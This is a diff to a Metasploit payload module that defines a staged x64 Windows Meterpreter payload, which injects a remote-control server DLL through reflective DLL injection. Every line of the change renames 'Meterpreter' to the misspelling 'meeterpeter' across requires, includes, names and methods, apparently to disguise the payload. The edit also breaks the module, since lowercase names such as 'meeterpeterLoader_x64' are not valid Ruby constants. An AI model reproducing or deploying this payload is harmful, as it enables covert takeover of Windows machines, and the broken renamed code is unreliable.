@@ -5,35 +5,35 @@
 
 
 require 'msf/core'
-require 'msf/core/payload/windows/x64/meterpreter_loader'
-require 'msf/base/sessions/meterpreter_x64_win'
-require 'msf/base/sessions/meterpreter_options'
-require 'rex/payloads/meterpreter/config'
+require 'msf/core/payload/windows/x64/meeterpeter_loader'
+require 'msf/base/sessions/meeterpeter_x64_win'
+require 'msf/base/sessions/meeterpeter_options'
+require 'rex/payloads/meeterpeter/config'
 
 ###
 #
-# Injects the x64 meterpreter server DLL via the Reflective Dll Injection payload
+# Injects the x64 meeterpeter server DLL via the Reflective Dll Injection payload
 # along with transport related configuration.
 #
 ###
 
 module Metasploit4
 
-  include Msf::Payload::Windows::MeterpreterLoader_x64
-  include Msf::Sessions::MeterpreterOptions
+  include Msf::Payload::Windows::meeterpeterLoader_x64
+  include Msf::Sessions::meeterpeterOptions
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'          => 'Windows Meterpreter (Reflective Injection x64)',
-      'Description'   => 'Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64)',
+      'Name'          => 'Windows meeterpeter (Reflective Injection x64)',
+      'Description'   => 'Inject the meeterpeter server DLL via the Reflective Dll Injection payload (staged x64)',
       'Author'        => ['skape','sf', 'OJ Reeves'],
       'PayloadCompat' => { 'Convention' => 'sockrdi', },
       'License'       => MSF_LICENSE,
-      'Session'       => Msf::Sessions::Meterpreter_x64_Win))
+      'Session'       => Msf::Sessions::meeterpeter_x64_Win))
   end
 
   def stage_payload(opts={})
-    stage_meterpreter + generate_config(opts)
+    stage_meeterpeter + generate_config(opts)
   end
 
   def generate_config(opts={})
@@ -50,7 +50,7 @@ module Metasploit4
     }
 
     # create the configuration instance based off the parameters
-    config = Rex::Payloads::Meterpreter::Config.new(config_opts)
+    config = Rex::Payloads::meeterpeter::Config.new(config_opts)
 
     # return the binary version of it
     config.to_b
